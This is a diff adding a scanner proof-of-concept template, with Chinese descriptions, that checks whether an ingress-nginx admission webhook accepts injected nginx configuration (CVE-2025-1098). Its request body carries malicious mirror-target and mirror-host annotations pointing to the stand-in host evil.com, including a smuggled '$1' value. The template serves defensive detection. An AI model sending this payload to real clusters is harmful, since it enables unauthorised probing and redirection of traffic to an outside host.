@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "检测 ingress-nginx admission controller 是否允许通过 mirror-target/mirror-host 注解注入恶意 nginx 配置。发送包含恶意注解的 AdmissionReview 请求，若 admission webhook 返回 allowed:true 则存在漏洞。"
+id = "POC-AVE-2025-0442"
+name = "Kubernetes ingress-nginx 配置注入漏洞 PoC"
+severity = "high"
+tags = ["ave-2025-0442"]
+vuln_id = [
+    "CVE-2025-1098",
+    "AVE-2025-0442",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admission"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"test-uid-12345","operation":"CREATE","object":{"apiVersion":"networking.k8s.io/v1","kind":"Ingress","metadata":{"name":"test-ingress-poc","annotations":{"nginx.ingress.kubernetes.io/mirror-target":"http://evil.com/","nginx.ingress.kubernetes.io/mirror-host":"evil.com$1"}},"spec":{"ingressClassName":"nginx","rules":[{"host":"poc-test.com","http":{"paths":[{"path":"/","pathType":"Prefix","backend":{"service":{"name":"test-svc","port":{"number":80}}}}]}}]}},"oldObject":null,"dryRun":false}}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"allowed":true']
